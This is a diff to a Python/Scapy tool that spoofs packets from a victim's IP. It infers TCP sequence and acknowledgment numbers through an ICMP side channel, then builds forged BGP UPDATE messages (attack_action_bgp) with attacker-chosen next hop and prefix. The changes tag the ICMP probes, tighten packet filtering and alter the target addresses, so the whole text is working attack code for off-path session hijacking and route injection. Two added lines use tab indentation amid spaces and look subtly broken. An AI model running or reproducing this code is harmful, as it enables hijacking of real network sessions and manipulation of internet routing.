@@ -100,20 +100,20 @@ class Ack_Finder:
 
     def check_new_point_seq(self, list_p):
         C = len(list_p)
-
+	icmp_seq = random.randint(0, (1 << 16) - 1)
         send_list = [IP(src=self.victim_ip, dst=self.server_ip) /
                      TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win,
                          ack=self.ack_check_start, flags='A'),
-                     IP(src=self.forge_ip, dst=self.server_ip) / ICMP()]
+                     IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
         for sq in list_p:
             send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                              TCP(sport=self.client_port, dport=self.server_port, seq=sq,
                                  ack=self.ack_check_start, flags='A') / 'a')
-            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP())
+            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
 
         while True:
-            pkts = sniff(filter="icmp and dst " + self.forge_ip,
-                         iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
+            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
+                         iface=self.bind_if_name, count=1 + C, timeout=2, started_callback=
                          lambda: send(send_list, iface=self.bind_if_name, verbose=False))
             if len(pkts) != 1 + C:
                 time.sleep(self.__sleep_time)
@@ -135,7 +135,7 @@ class Ack_Finder:
 
         rb = self.seq_in_win
         lb = self.seq_in_win - (self.BLOCK * 2)
-        D = 6
+        D = 3
 
         ans = -1
         while rb >= lb:
@@ -161,16 +161,16 @@ class Ack_Finder:
 
     def check_new_point_ack(self, list_p):
         C = len(list_p)
-
-        send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP()]
+	icmp_seq = random.randint(0, (1 << 16) - 1)
+        send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
         for ac in list_p:
             send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                              TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win, ack=ac, flags='A'))
-            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP())
+            send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
 
         while True:
-            pkts = sniff(filter="icmp and dst " + self.forge_ip,
-                         iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
+            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
+                         iface=self.bind_if_name, count=1 + C, timeout=2, started_callback=
                          lambda: send(send_list, iface=self.bind_if_name, verbose=False))
             if len(pkts) != 1 + C:
                 time.sleep(self.__sleep_time)
@@ -192,7 +192,7 @@ class Ack_Finder:
             return list_next[0]
 
     def __C(self, ls, lb, rb):
-        D = 2
+        D = 4
         # revise
         for i in range(0, len(ls)):
             ls[i] = ls[i] if ls[i] >= 0 else ls[i] + (1 << 32)
@@ -309,7 +309,7 @@ def attack_action_bgp(client_ip, server_ip, client_port, server_port, seq, ack, 
     flag3 = 0x40
     type3 = 3
     len3 = 4
-    next_hop = socket.inet_aton('10.10.100.1')
+    next_hop = socket.inet_aton('192.168.66.111')
     attr3 = struct.pack('!BBB4s', flag3, type3, len3, next_hop)
 
     # attr4
@@ -321,7 +321,7 @@ def attack_action_bgp(client_ip, server_ip, client_port, server_port, seq, ack, 
 
     # address info
     prefix_len = 24
-    network_addr = socket.inet_aton('11.11.11.0')
+    network_addr = socket.inet_aton('77.77.77.77')
     b_network = struct.pack('!B3s', prefix_len, network_addr[:3])
 
     bgp_payload = one_payload + hd_bgp + attr1 + attr2 + attr3 + attr4 + b_network
